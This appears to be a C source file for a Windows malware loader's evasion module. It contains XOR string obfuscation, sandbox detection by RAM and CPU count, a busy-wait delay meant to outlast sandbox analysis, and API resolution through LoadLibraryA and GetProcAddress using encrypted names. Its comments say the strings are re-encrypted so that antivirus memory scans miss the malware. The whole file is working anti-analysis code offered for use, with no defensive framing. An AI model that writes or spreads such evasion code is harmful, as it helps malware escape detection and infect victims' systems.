#include "config.h"
#include "evasion.h"
#include <stdio.h>

void xor_crypt(char *data, size_t data_len, const char *key, size_t key_len) {

    if (data_len == 0 || key_len == 0) {
        return; 
    }

    for (size_t i = 0; i < data_len; i++) {
        data[i] = data[i] ^ key[i % key_len];
    }

    // NOTE: no return -> data is modified in RAM

}

bool check_resources() {
    
    // check RAM
    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
    GlobalMemoryStatusEx(&memInfo); // Windows API to read memory
    
    DWORDLONG ram_gb = memInfo.ullTotalPhys / (1024 * 1024 * 1024);
    
    if (ram_gb < 4) {
        return false; 
    }

    // check CPU cores
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo); // Windows API to read hardware info
    
    if (sysInfo.dwNumberOfProcessors < 2) {
        return false;
    }

    return true;

}

void smart_delay() {

    // NOTE: volatile is fundamental
    // otherwise C compiler would skip the cycle because useless
    volatile int garbage = 0;
    
    // cycle to pass the 3-5 seconds sandbox
    // NOTE: we cannot use Sleep() -> skipped in sandbox
    for (int i = 0; i < SANDBOX_DELAY_CYCLES; i++) {
        garbage += i;
        garbage -= i;
    }

}

FARPROC resolve_api(char* enc_dll, size_t dll_len, char* enc_func, size_t func_len, const char* key, size_t key_len) {
    
    // decode strings
    xor_crypt(enc_dll, dll_len, key, key_len);
    xor_crypt(enc_func, func_len, key, key_len);

    // load DDL
    HMODULE hModule = LoadLibraryA(enc_dll);
    FARPROC pFunction = NULL;
    
    if (hModule != NULL) {
        pFunction = GetProcAddress(hModule, enc_func); // get function address
    }

    // OPSEC: encode strings again
    // AV constantly scan RAM -> undecrypted strings could reveal malware presence
    xor_crypt(enc_dll, dll_len, key, key_len);
    xor_crypt(enc_func, func_len, key, key_len);

    // return generic pointer (FARPROC)
    return pFunction;

}